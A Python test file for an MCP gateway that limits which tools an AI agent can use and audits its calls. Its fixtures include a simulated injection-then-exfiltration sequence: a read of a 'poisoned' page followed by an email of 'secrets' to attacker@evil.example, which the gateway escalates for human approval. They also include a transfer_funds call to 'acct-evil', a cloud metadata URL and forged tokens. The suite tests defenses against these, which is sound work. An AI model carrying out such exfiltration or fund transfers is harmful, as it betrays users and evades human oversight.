"""Day 14: the MCP gateway (`/mcp`).

  unit   no broker, no database: how a gate outcome becomes an MCP tool result, the hints sent to
         clients, and the transport checks that run before anything else (protocol version,
         body size, missing login).
  live   against a running LOCAL broker, its database, OpenFGA and the mock issuer, using the
         real MCP SDK client. Runs the Day 14 done check:
           - an MCP client sees only the tools its agent was granted;
           - a call to a tool it was never shown is denied and audited;
           - a tainting tool followed by an egress tool escalates, the call blocks with progress
             notifications, and Approve returns the tool's result (Deny and a client that gives
             up both end as a refusal, and the approval can no longer be used);
           - no / forged / unmapped login is refused; a session id can't be used by another agent.
         Registers d14-bot and d14-peer (they stay registered, with no grants afterwards). Its
         Auth0 tokens are signed through the mock issuer's /sign hook, so no Auth0 client has to
         be shared with Day 13's agents.

  .\\scripts\\test_day14.ps1              # both parts, in the broker's container
  python broker/tests/test_day14.py [--unit-only]
      env: DATABASE_URL, AGENTGATE_ADMIN_KEY, AGENTGATE_URL (default http://broker:8000),
           MOCK_ISSUER_URL (default http://mock-issuer:9191), AUTH0_AUDIENCE

Never point it at production: it registers agents and changes grants. Exit 0 = all passed.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))     # broker/ (or /srv in the container)

import httpx  # noqa: E402
import mcp_types as types  # noqa: E402
from mcp_types.version import HANDSHAKE_PROTOCOL_VERSIONS  # noqa: E402

from app import mcp_gateway  # noqa: E402
from app.registry import Tool  # noqa: E402

FAILED: list[str] = []
COUNT = 0


def check(name: str, ok: bool, detail: object = "") -> None:
    global COUNT
    COUNT += 1
    if not ok:
        FAILED.append(name)
    print(f"  {'ok  ' if ok else 'FAIL'} {name}" + (f"   [{str(detail)[:300]}]" if detail and not ok else ""))


# ------------------------------------------------------------------ unit


async def asgi_call(headers: dict[str, str], gateway: mcp_gateway.McpGateway | None = None) -> tuple[int, dict]:
    """Drive the ASGI wrapper directly. Used only for refusals that happen before the database."""
    gw = gateway or mcp_gateway.McpGateway()
    sent: list[dict] = []

    async def send(msg: dict) -> None:
        sent.append(msg)

    async def receive() -> dict:
        return {"type": "http.request", "body": b"", "more_body": False}

    scope = {"type": "http", "method": "POST", "path": "/mcp",
             "headers": [(k.lower().encode(), v.encode()) for k, v in headers.items()]}
    await gw.asgi(scope, receive, send)
    status = sent[0]["status"]
    body = json.loads(sent[1]["body"]) if len(sent) > 1 and sent[1].get("body") else {}
    return status, body


async def unit() -> None:
    print("unit: results")
    ok = mcp_gateway.result_of(200, {"decision": "allow", "reason": "r", "tool": "t", "audit_id": 1,
                                     "result": {"customers": [1, 2]}})
    check("an allowed call returns the tool's result as text and structured content",
          not ok.is_error and json.loads(ok.content[0].text) == {"customers": [1, 2]}
          and ok.structured_content == {"customers": [1, 2]}, ok)
    deny = mcp_gateway.result_of(403, {"decision": "deny", "reason": "agent may not use send_email",
                                       "tool": "send_email", "audit_id": 42})
    check("a denial is an error result that says why and names the audit row",
          deny.is_error and "deny: agent may not use send_email" in deny.content[0].text
          and "audit #42" in deny.content[0].text, deny)
    inval = mcp_gateway.result_of(422, {"decision": "deny", "reason": "invalid arguments: x", "tool": "t", "audit_id": 3})
    check("invalid arguments are an error result too", inval.is_error, inval)
    up = mcp_gateway.result_of(502, {"decision": "allow", "reason": "upstream error: timeout", "tool": "t", "audit_id": 4})
    check("an upstream error is an error result", up.is_error and "upstream error" in up.content[0].text, up)
    odd = mcp_gateway.result_of(500, "nonsense")
    check("an unexpected body still gives an error result, not an exception", odd.is_error, odd)

    print("unit: what clients are shown")
    ro = Tool(name="read_x", risk_class="read", taints=False, enabled=True)
    wr = Tool(name="send_x", risk_class="egress", taints=False, enabled=True)
    money = Tool(name="pay_x", risk_class="money", taints=False, enabled=True)
    web = Tool(name="web_x", risk_class="read", taints=True, enabled=True)
    a = mcp_gateway._annotations
    check("a read tool is marked read-only", a(ro).read_only_hint is True and a(ro).destructive_hint is False, a(ro))
    check("an egress tool is marked open-world", a(wr).open_world_hint is True and a(wr).read_only_hint is False, a(wr))
    check("a money tool is marked destructive", a(money).destructive_hint is True, a(money))
    check("a tool that returns untrusted content is marked open-world", a(web).open_world_hint is True, a(web))
    check("a registry schema that is an object is passed through",
          mcp_gateway._input_schema(Tool(name="t", args_schema={"type": "object", "required": ["a"]}))["required"] == ["a"])
    check("anything else is shown as a bare object schema",
          mcp_gateway._input_schema(Tool(name="t", args_schema={"type": "array"})) == {"type": "object"})

    print("unit: mcp upstream rows")
    from app import mcp_upstream as mu
    env = {"UPSTREAM_REMOTE": "secret-value-123", "UPSTREAM_PRIVATE_HOSTS": "mock-upstream"}

    def compiled(**over):
        row = {"kind": "mcp", "url": "https://mcp.example.com/mcp", "tool": "create_issue", **over}
        return mu.compile_mcp(row, {}, over.pop("_cred", "UPSTREAM_REMOTE"), env)

    plan, why = compiled()
    check("a plain https row compiles", plan is not None and plan.remote_tool == "create_issue" and why is None, why)
    check("  ... and plain http to an unlisted host is refused", compiled(url="http://mcp.example.com/mcp")[1] is not None)
    check("  ... a private address is refused", compiled(url="https://10.0.0.5/mcp")[1] is not None)
    check("  ... the metadata address is refused", compiled(url="http://169.254.169.254/mcp")[1] is not None)
    check("  ... a placeholder in the URL is refused", "placeholders" in (compiled(url="https://x.example.com/{a}")[1] or ""))
    check("  ... a user name in the URL is refused", compiled(url="https://u:p@mcp.example.com/mcp")[1] is not None)
    check("  ... an unknown key is refused", "unknown key" in (compiled(extra=1)[1] or ""))
    check("  ... a missing or odd remote tool name is refused", compiled(tool="a b")[1] is not None
          and mu.compile_mcp({"kind": "mcp", "url": "https://mcp.example.com/mcp"}, {}, "UPSTREAM_REMOTE", env)[1] is not None)
    check("  ... a credential_ref that isn't UPSTREAM_* is refused",
          mu.compile_mcp({"kind": "mcp", "url": "https://mcp.example.com/mcp", "tool": "t"}, {}, "DATABASE_URL", env)[1] is not None)
    check("  ... a host on the private list is allowed over http",
          mu.compile_mcp({"kind": "mcp", "url": "http://mock-upstream:9090/mcp", "tool": "t"}, {}, "UPSTREAM_REMOTE", env)[0] is not None)
    from app.registry import compile_row
    base = {"name": "gh.create_issue", "risk_class": "write", "context_map": {}, "enabled": True,
            "args_schema": {"type": "object", "properties": {"title": {"type": "string"}}}}
    row = compile_row({**base, "upstream": {"kind": "mcp", "url": "https://mcp.example.com/mcp", "tool": "create_issue",
                                            "auth": {"type": "bearer"}}})
    check("a registry row that wants a bearer credential but names none is unusable (calls are denied)",
          row.problem is not None and row.mcp is None, row.problem)
    row = compile_row({**base, "upstream": {"kind": "mcp", "url": "https://mcp.example.com/mcp", "tool": "create_issue"}})
    check("  ... with no credential and no auth it compiles (an open server)", row.problem is None and row.mcp is not None, row.problem)
    msgs = (b'event: message\ndata: {"jsonrpc":"2.0","method":"notifications/message","params":{}}\n\n'
            b'event: message\ndata: {"jsonrpc":"2.0","id":2,"result":{"ok":1}}\n\n')
    check("an event-stream answer: the message with the right id is found among notifications",
          mu._parse("text/event-stream", msgs, 2) == {"jsonrpc": "2.0", "id": 2, "result": {"ok": 1}})
    check("  ... a different id is not accepted", mu._parse("text/event-stream", msgs, 3) is None)
    check("  ... junk gives no answer, not an exception", mu._parse("application/json", b"<html>", 1) is None)
    text, structured = mu._text_of({"content": [{"type": "text", "text": "hi"}, {"type": "image", "data": "AAAA"}]})
    check("images from a remote server are named, never forwarded", text == "hi\n[image content omitted]", text)

    print("unit: transport checks")
    status, body = await asgi_call({"Mcp-Protocol-Version": "2026-07-28"})
    check("the sessionless protocol version is refused with 400 / -32022", status == 400
          and body["error"]["code"] == -32022, (status, body))
    check("  ... and the answer lists the supported versions",
          body["error"]["data"]["supported"] == list(HANDSHAKE_PROTOCOL_VERSIONS), body)
    status, body = await asgi_call({"Content-Length": str(10 ** 7)})
    check("a body over the cap is refused with 413", status == 413, (status, body))
    status, body = await asgi_call({"Content-Length": "abc"})
    check("a bad Content-Length is refused with 400", status == 400, (status, body))


# ------------------------------------------------------------------ live

D1, D2, D3 = (f"d14Client000000000000000000000{i}" for i in (1, 2, 3))     # D3 is mapped to no agent
BOT, PEER = "d14-bot", "d14-peer"
MOCK_TOOLS = ("echo", "leak", "fail", "big", "page", "refmap")
GRANTS = {BOT: [("query_customers", "direct"), ("read_web", "direct"), ("send_email", "direct_if_untainted"),
                ("send_email", "approval")],      # clean session: direct; tainted session: a human decides
          PEER: [("query_customers", "direct")]}


class Live:
    def __init__(self) -> None:
        self.base = os.environ.get("AGENTGATE_URL", "http://broker:8000").rstrip("/")
        self.issuer = os.environ.get("MOCK_ISSUER_URL", "http://mock-issuer:9191").rstrip("/")
        self.audience = os.environ.get("AUTH0_AUDIENCE", "https://agentgate.local/api")
        self.admin_key = os.environ["AGENTGATE_ADMIN_KEY"]
        self.http = httpx.Client(timeout=60, trust_env=False)
        self.iss_name = self.http.get(f"{self.issuer}/stats").json()["issuer"]

    def admin(self, method: str, path: str, body=None, **params):
        r = self.http.request(method, f"{self.base}{path}", json=body, headers={"X-Admin-Key": self.admin_key},
                              params=params or None)
        try:
            return r.status_code, r.json()
        except ValueError:
            return r.status_code, {}

    def bearer(self, client_id: str, **over) -> str:
        now = int(time.time())
        claims = {"iss": self.iss_name, "sub": f"{client_id}@clients", "aud": self.audience, "iat": now - 5,
                  "exp": now + 3600, "gty": "client-credentials", "azp": client_id}
        claims.update(over)
        return self.http.post(f"{self.issuer}/sign", json={"claims": claims, "key": "published"}).json()["token"]


def client_for(base: str, bearer: str | None):
    from mcp.client.client import Client
    from mcp.client.streamable_http import streamable_http_client
    import httpx2
    headers = {"Authorization": f"Bearer {bearer}"} if bearer is not None else {}
    http = httpx2.AsyncClient(headers=headers, timeout=60)
    return Client(streamable_http_client(f"{base}/mcp", http_client=http), mode="auto")


def text_of(result) -> str:
    return " ".join(c.text for c in result.content if getattr(c, "type", "") == "text")


async def head(db) -> int:
    return await db.fetchval("SELECT coalesce(max(id), 0) FROM audit_events")


async def live() -> None:
    import asyncpg
    g = Live()
    db = await asyncpg.connect(os.environ["DATABASE_URL"])
    try:
        await _live(g, db)
    finally:
        for agent, grants in GRANTS.items():
            for tool, _ in grants:
                g.admin("DELETE", f"/agents/{agent}/grants", tool=tool)
        for name in MOCK_TOOLS:
            g.admin("DELETE", f"/agents/{BOT}/grants", tool=f"mock.{name}")
            g.admin("DELETE", f"/tools/mock.{name}")
        await db.close()


async def pending_approval(db, agent: str, after: int, timeout: float = 20.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        row = await db.fetchrow("SELECT * FROM approvals WHERE agent_id = $1 AND status = 'pending' "
                                "AND created_at > now() - interval '1 minute' ORDER BY created_at DESC LIMIT 1", agent)
        if row:
            return row
        await asyncio.sleep(0.3)
    return None


async def _live(g: Live, db) -> None:
    print("live: setup")
    status, health = (lambda r: (r.status_code, r.json()))(g.http.get(f"{g.base}/health"))
    check("the broker reports agent login is on (the gateway needs it)", health.get("agent_login") == "auth0", health)
    for agent, client in ((BOT, D1), (PEER, D2)):
        status, body = g.admin("POST", "/agents", {"id": agent, "owner": "shiwin", "auth0_client_id": client})
        if status == 409:
            g.admin("PATCH", f"/agents/{agent}", {"status": "active"})
            status, body = g.admin("PATCH", f"/agents/{agent}", {"auth0_client_id": client})
        check(f"{agent} is registered and mapped to its Auth0 client", status in (200, 201), body)
        for tool, mode in GRANTS[agent]:
            status, body = g.admin("POST", f"/agents/{agent}/grants", {"tool": tool, "mode": mode})
            check(f"  ... granted {tool} ({mode})", status in (201, 409), body)
    time.sleep(1.2)
    await db.execute("UPDATE tokens SET expires_at = now() - interval '1 second' WHERE agent_id LIKE 'd14-%'")

    print("live: logging in to /mcp")
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
        "protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "d14", "version": "1"}}}
    mcp_headers = {"Accept": "application/json, text/event-stream", "Content-Type": "application/json"}
    r = g.http.post(f"{g.base}/mcp", json=init, headers=mcp_headers)
    check("no token: 401", r.status_code == 401, r.text)
    check("  ... with a WWW-Authenticate challenge", "bearer" in r.headers.get("www-authenticate", "").lower(), r.headers)
    mark = await head(db)
    r = g.http.post(f"{g.base}/mcp", json=init, headers={**mcp_headers, "Authorization": "Bearer not.a.jwt"})
    check("a forged token: 401, and not in the audit chain", r.status_code == 401 and await head(db) == mark, r.text)
    r = g.http.post(f"{g.base}/mcp", json=init,
                    headers={**mcp_headers, "Authorization": f"Bearer {g.bearer(D1, aud='https://evil.example/')}"})
    check("another audience: 401, audited", r.status_code == 401 and await head(db) > mark, r.text)
    row = await db.fetchrow("SELECT * FROM audit_events WHERE id = (SELECT max(id) FROM audit_events)")
    check("  ... the audit row says it was the MCP login", row and "MCP login" in row["reason"], dict(row) if row else None)
    r = g.http.post(f"{g.base}/mcp", json=init, headers={**mcp_headers, "Authorization": f"Bearer {g.bearer(D3)}"})
    check("a client mapped to no agent: 403", r.status_code == 403, r.text)
    r = g.http.post(f"{g.base}/mcp", json=init, headers={
        **mcp_headers, "Authorization": f"Bearer {g.bearer(D1)}", "MCP-Protocol-Version": "2026-07-28"})
    check("the sessionless protocol version: 400 / -32022 (clients fall back)",
          r.status_code == 400 and r.json()["error"]["code"] == -32022, r.text)

    print("live: what an agent sees")
    async with client_for(g.base, g.bearer(D1)) as bot:
        check("the client negotiates a handshake-era protocol", str(bot.protocol_version) in HANDSHAKE_PROTOCOL_VERSIONS,
              bot.protocol_version)
        tools = (await bot.list_tools()).tools
        names = sorted(t.name for t in tools)
        check("d14-bot sees exactly its three granted tools", names == ["query_customers", "read_web", "send_email"], names)
        check("  ... and no tool it wasn't granted (transfer_funds, read_inbox)",
              not {"transfer_funds", "read_inbox"} & set(names), names)
        send = next(t for t in tools if t.name == "send_email")
        check("  ... with the registry's argument schema", send.input_schema.get("required") == ["to", "subject", "body"],
              send.input_schema)
        check("  ... and hints (egress = open world)", send.annotations and send.annotations.open_world_hint is True,
              send.annotations)

        r = await bot.call_tool("query_customers", {"limit": 2})
        check("a granted tool runs through the gate", not r.is_error and "customers" in text_of(r), text_of(r))
        ev = await db.fetchrow("SELECT * FROM audit_events WHERE event_type = 'tool_call' AND agent_id = $1 "
                               "AND tool = 'query_customers' ORDER BY id DESC LIMIT 1", BOT)
        check("  ... and is audited as an allow", ev and ev["decision"] == "allow", dict(ev) if ev else None)
        tok = await db.fetchrow("SELECT * FROM tokens WHERE agent_id = $1 ORDER BY issued_at DESC LIMIT 1", BOT)
        check("  ... under a short-lived AgentGate token the gateway minted (login = auth0)",
              tok and tok["login"] == "auth0" and (tok["expires_at"] - tok["issued_at"]).total_seconds() <= 900, dict(tok) if tok else None)

        r = await bot.call_tool("transfer_funds", {"amount": 5, "to_account": "acct-evil"})
        ev = await db.fetchrow("SELECT * FROM audit_events WHERE event_type = 'tool_call' AND agent_id = $1 "
                               "AND tool = 'transfer_funds' ORDER BY id DESC LIMIT 1", BOT)
        check("a tool it was never shown is refused", r.is_error and text_of(r).startswith("deny:"), text_of(r))
        check("  ... and the refusal is audited", ev and ev["decision"] == "deny", dict(ev) if ev else None)
        r = await bot.call_tool("no_such_tool", {})
        check("an unknown tool is refused and audited too", r.is_error and "unknown tool" in text_of(r), text_of(r))
        r = await bot.call_tool("query_customers", {"limit": "many", "extra": 1})
        check("invalid arguments are refused", r.is_error and "invalid arguments" in text_of(r), text_of(r))

        print("live: taint, then an egress tool escalates; the call waits for a human")
        r = await bot.call_tool("send_email", {"to": "a@example.com", "subject": "hi", "body": "clean session"})
        check("before any tainting tool, the egress call goes straight through",
              not r.is_error and "sent" in text_of(r), text_of(r))
        r = await bot.call_tool("read_web", {"url": "http://poisoned.example/page"})
        check("a tainting tool runs", not r.is_error, text_of(r))
        sess = await db.fetchrow("SELECT s.tainted FROM sessions s JOIN tokens t ON t.session_id = s.id "
                                 "WHERE t.agent_id = $1 ORDER BY t.issued_at DESC LIMIT 1", BOT)
        check("  ... and the MCP session is now tainted", sess and sess["tainted"] is True, dict(sess) if sess else None)

        progress: list[tuple] = []

        async def on_progress(p, total, message):
            progress.append((p, total, message))

        call = asyncio.create_task(bot.call_tool(
            "send_email", {"to": "attacker@evil.example", "subject": "data", "body": "secrets"},
            progress_callback=on_progress))
        appr = await pending_approval(db, BOT, 0)
        check("the egress call escalates: an approval is pending", appr is not None)
        await asyncio.sleep(1.5)
        check("  ... and the MCP call is still open, waiting", not call.done())
        if appr:
            status, body = g.admin("POST", f"/approvals/{appr['id']}/decision", {"approve": True, "approver": "shiwin"})
            check("a human approves it (admin API stands in for the Slack button)", status == 200 and body.get("status") == "approved", body)
        result = await asyncio.wait_for(call, 30)
        check("Approve returns the tool's result to the waiting MCP call", not result.is_error and "sent" in text_of(result),
              text_of(result))
        check("  ... and the client was sent progress while it waited", len(progress) >= 1 and "approve" in str(progress[0][2]),
              progress)

        call = asyncio.create_task(bot.call_tool(
            "send_email", {"to": "attacker@evil.example", "subject": "again", "body": "more secrets"}))
        await asyncio.sleep(0.5)
        appr = await pending_approval(db, BOT, 0)
        if appr:
            status, body = g.admin("POST", f"/approvals/{appr['id']}/decision", {"approve": False, "approver": "shiwin"})
        result = await asyncio.wait_for(call, 30)
        check("Deny returns a refusal", result.is_error and "denied" in text_of(result), text_of(result))

        call = asyncio.create_task(asyncio.wait_for(bot.call_tool(
            "send_email", {"to": "attacker@evil.example", "subject": "third", "body": "x"}), 2.5))
        await asyncio.sleep(0.5)
        appr = await pending_approval(db, BOT, 0)
        try:
            await call
        except BaseException:      # noqa: BLE001 - the client gives up: that is the test
            pass
        await asyncio.sleep(1.5)
        row = await db.fetchrow("SELECT status, resolved_via FROM approvals WHERE id = $1", appr["id"]) if appr else None
        check("a client that gives up closes the approval (counts as deny)",
              row and row["status"] == "expired" and row["resolved_via"] == "agent-cancel", dict(row) if row else None)
        if appr:
            status, body = g.admin("POST", f"/approvals/{appr['id']}/decision", {"approve": True, "approver": "shiwin"})
            check("  ... so a late Approve is refused", status >= 400, (status, body))

    print("live: another agent")
    async with client_for(g.base, g.bearer(D2)) as peer:
        names = sorted(t.name for t in (await peer.list_tools()).tools)
        check("d14-peer sees only query_customers", names == ["query_customers"], names)
        r = await peer.call_tool("send_email", {"to": "a@example.com", "subject": "s", "body": "b"})
        ev = await db.fetchrow("SELECT * FROM audit_events WHERE event_type = 'tool_call' AND agent_id = $1 "
                               "AND tool = 'send_email' ORDER BY id DESC LIMIT 1", PEER)
        check("a hidden tool is denied and audited against the agent that tried it",
              r.is_error and ev and ev["decision"] == "deny", (text_of(r), dict(ev) if ev else None))

    print("live: sessions belong to the agent that opened them")
    r = g.http.post(f"{g.base}/mcp", json=init, headers={**mcp_headers, "Authorization": f"Bearer {g.bearer(D1)}"})
    sid = r.headers.get("mcp-session-id")
    check("an MCP session is opened with a session id", r.status_code == 200 and sid, (r.status_code, r.headers))
    h2 = {**mcp_headers, "Authorization": f"Bearer {g.bearer(D2)}", "Mcp-Session-Id": sid or "x",
          "MCP-Protocol-Version": "2025-11-25"}
    r = g.http.post(f"{g.base}/mcp", json={"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, headers=h2)
    check("another agent can't use that session id", r.status_code in (400, 401, 403, 404), (r.status_code, r.text[:200]))

    await upstream_live(g, db)
    print(f"\n{COUNT - len(FAILED)}/{COUNT} passed")


async def upstream_live(g: Live, db) -> None:
    print("live: tools that forward to a remote MCP server (the mock upstream's /mcp)")
    url = os.environ.get("MOCK_UPSTREAM_URL", "http://mock-upstream:9090").rstrip("/") + "/mcp"
    for name in MOCK_TOOLS:      # an earlier run's leftovers
        g.admin("DELETE", f"/agents/{BOT}/grants", tool=f"mock.{name}")
        g.admin("DELETE", f"/tools/mock.{name}")
    body = {"prefix": "mock", "url": url, "credential_ref": "UPSTREAM_MOCK_TOKEN"}

    status, out = g.admin("POST", "/mcp-upstreams/import", {**body, "credential_ref": "AGENTGATE_ADMIN_KEY"})
    check("a credential_ref that isn't UPSTREAM_* is refused", status == 400, (status, out))
    status, out = g.admin("POST", "/mcp-upstreams/import", {**body, "url": "http://169.254.169.254/mcp"})
    check("a URL that points at the metadata address is refused", status == 400, (status, out))
    status, out = g.admin("POST", "/mcp-upstreams/import", {**body, "auth": {"type": "none"}, "credential_ref": None})
    check("a server that rejects the broker's credential is a clear 502", status == 502 and "refused" in str(out), (status, out))
    status, out = g.admin("POST", "/mcp-upstreams/import", {**body, "prefix": "Bad Prefix"})
    check("a bad prefix is refused", status == 400, (status, out))

    status, out = g.admin("POST", "/mcp-upstreams/import", body)
    check("import adds the remote tools", status == 200 and sorted(out.get("imported", [])) ==
          sorted(f"mock.{n}" for n in MOCK_TOOLS if n != "refmap"), (status, out))
    check("  ... and skips a tool whose schema the gate can't use, saying why",
          any(x["name"] == "refmap" for x in out.get("skipped", [])), out)
    status, rows = g.admin("GET", "/tools")
    row = next((t for t in rows if t["name"] == "mock.echo"), {})
    check("  ... imported rows are disabled, destructive and tainting",
          row.get("enabled") is False and row.get("risk_class") == "destructive" and row.get("taints_session") is True, row)
    check("  ... and name the credential, never hold it",
          row.get("credential_ref") == "UPSTREAM_MOCK_TOKEN" and row.get("upstream", {}).get("kind") == "mcp", row)
    status, again = g.admin("POST", "/mcp-upstreams/import", body)
    check("importing again overwrites nothing", status == 200 and not again.get("imported"), again)

    for name, risk, taints in (("echo", "read", True), ("leak", "read", True), ("fail", "read", False),
                               ("big", "read", True)):
        status, _ = g.admin("PATCH", f"/tools/mock.{name}", {"risk_class": risk, "taints_session": taints, "enabled": True})
        g.admin("POST", f"/agents/{BOT}/grants", {"tool": f"mock.{name}", "mode": "direct"})
    for tool, mode in GRANTS[BOT]:
        g.admin("POST", f"/agents/{BOT}/grants", {"tool": tool, "mode": mode})
    # mock.page stays disabled and mock.* granted tools are only for d14-bot
    await db.execute("UPDATE tokens SET expires_at = now() - interval '1 second' WHERE agent_id = $1", BOT)
    await db.execute("UPDATE sessions SET tainted = false WHERE id IN (SELECT session_id FROM tokens WHERE agent_id = $1)", BOT)

    async with client_for(g.base, g.bearer(D1)) as bot:
        names = sorted(t.name for t in (await bot.list_tools()).tools)
        check("the MCP client sees the enabled, granted remote tools (and not the disabled one)",
              "mock.echo" in names and "mock.leak" in names and "mock.page" not in names, names)
        r = await bot.call_tool("mock.echo", {"text": "hello"})
        check("a remote tool runs through the gate and the upstream", not r.is_error and "echo: hello" in text_of(r), text_of(r))
        sess = await db.fetchrow("SELECT s.tainted FROM sessions s JOIN tokens t ON t.session_id = s.id "
                                 "WHERE t.agent_id = $1 ORDER BY t.issued_at DESC LIMIT 1", BOT)
        check("  ... its output is untrusted: the session is now tainted", sess and sess["tainted"] is True, dict(sess) if sess else None)
        r = await bot.call_tool("mock.echo", {"text": 5})
        check("  ... arguments are checked against the imported schema", r.is_error and "invalid arguments" in text_of(r), text_of(r))
        r = await bot.call_tool("mock.leak", {})
        token = os.environ.get("UPSTREAM_MOCK_TOKEN", "")
        check("an upstream that echoes the credential can't leak it to the agent",
              not r.is_error and "redacted" in text_of(r) and (not token or token not in text_of(r)), text_of(r))
        r = await bot.call_tool("mock.fail", {})
        check("a remote tool error comes back as an MCP error result", r.is_error and "failed on purpose" in text_of(r), text_of(r))
        r = await bot.call_tool("mock.big", {"kb": 1024})
        check("an answer over the size cap is refused", r.is_error and "larger than" in text_of(r), text_of(r))
        ev = await db.fetchrow("SELECT * FROM audit_events WHERE event_type = 'tool_call' AND agent_id = $1 AND tool = 'mock.big' "
                               "ORDER BY id DESC LIMIT 1", BOT)
        check("  ... and the audit row says upstream error, with no content", ev and "upstream error" in ev["reason"], dict(ev) if ev else None)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--unit-only", action="store_true")
    args = ap.parse_args()
    asyncio.run(unit())
    if not args.unit_only:
        asyncio.run(live())
    if FAILED:
        print("FAILED:\n  " + "\n  ".join(FAILED))
        sys.exit(1)
    print(f"\nall {COUNT} checks passed")


if __name__ == "__main__":
    main()
